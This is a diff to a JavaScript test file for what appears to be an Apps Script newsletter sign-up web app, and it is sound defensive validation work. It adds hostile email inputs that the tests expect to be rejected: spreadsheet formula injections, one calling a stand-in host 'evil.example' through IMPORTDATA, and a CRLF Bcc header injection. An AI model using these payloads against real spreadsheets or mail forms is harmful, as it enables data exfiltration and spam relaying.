@@ -14,13 +14,24 @@ assert.deepEqual(globals.filter(name => !name.endsWith('_')).sort(), ['doGet', '
   'a public web app exposes every non-private function: only doGet and subscribe may exist');
 
 const rows = [];
+const textFormatted = [];
 let sheetExists = false;
 let locks = 0;
 let cache = {};
 const sheet = {
   getLastRow: () => rows.length + 1,
-  getRange: (row, column, count) => ({ getValues: () => rows.slice(row - 2, row - 2 + count).map(entry => [entry[0]]), setValues: () => ({ setFontWeight: () => {} }) }),
-  appendRow: row => rows.push(row),
+  getRange: (row, column, count) => {
+    const range = {
+      getValues: () => rows.slice(row - 2, row - 2 + count).map(entry => [entry[0]]),
+      setNumberFormats: formats => { textFormatted[row] = formats[0][0] === '@'; return range; },
+      setValues: values => {
+        if (row > 1) { assert.ok(textFormatted[row], 'the address cell is formatted as plain text before it is written'); rows[row - 2] = values[0]; }
+        return range;
+      },
+      setFontWeight: () => range
+    };
+    return range;
+  },
   setFrozenRows: () => {}
 };
 const context = {
@@ -47,6 +58,20 @@ assert.equal(rows.length, 1, 'duplicates are ignored regardless of case');
 for (const bad of ['', 'nobody', 'a@b', 'two words@example.com', null, undefined, 'x@example.com' + 'y'.repeat(260)]) {
   assert.equal(context.subscribe(bad, '').ok, false, 'rejected: ' + String(bad).slice(0, 20));
 }
+// Spreadsheet formulas and mail-header or address-list tricks that a loose pattern would let through.
+for (const attack of [
+  '=IMPORTDATA("https://evil.example/?a=b@c.de")', '=HYPERLINK("https://evil.example")@a.bc', '+1+1@a.bc', '-2@a.bc', '@a.bc',
+  '\'=1@a.bc', 'a,b@example.com', 'a;b@example.com', '<b>@example.com', '"quoted"@example.com', 'a@b@example.com',
+  'a@example.com\r\nBcc: victim@example.org', 'a@example.com\nx', 'a..b@example.com', 'a@exa..mple.com', 'a@example.c', 'a@example.123',
+  'jos\u00e9@example.com', 'a b@example.com', 'a@exa mple.com', 'a@example.com>', '(a)@example.com'
+]) {
+  assert.equal(context.subscribe(attack, '').ok, false, 'rejected: ' + JSON.stringify(attack));
+}
+assert.equal(rows.length, 1, 'no rejected address reaches the Sheet');
+for (const good of ['o\'brien@example.com', 'first.last+club@mail.example.co.uk', 'a_b-c%d@sub-domain.example.org']) {
+  assert.equal(context.subscribe(good, '').ok, true, 'accepted: ' + good);
+}
+rows.length = 1;
 assert.equal(result(context.subscribe('bot@example.com', 'http://spam.example')), '{"ok":true}');
 assert.equal(rows.length, 1, 'a filled honeypot adds nothing');
 assert.equal(locks, 0, 'the lock is always released');
